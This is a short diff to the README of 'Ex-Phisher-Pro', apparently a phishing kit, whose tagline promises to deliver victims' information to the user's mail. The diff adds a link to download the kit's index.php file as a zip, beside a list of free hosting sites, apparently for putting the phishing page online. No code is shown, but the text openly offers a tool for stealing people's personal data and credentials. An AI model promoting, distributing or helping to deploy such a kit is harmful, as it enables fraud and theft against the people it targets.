@@ -1,6 +1,9 @@
 # Ex-Phisher-Pro
 Get Victims Information Recived Your Mail
 
+* Download 
+<a href="https://raw.githubusercontent.com/Teamex07/Ex-Phisher-Pro/main/index.zip">Download Index.php File Now</>
+
 # Free Hosting Sites
 
 <a href="https://freewebhostingarea.com/">Free Hosting Area</a><br></br>
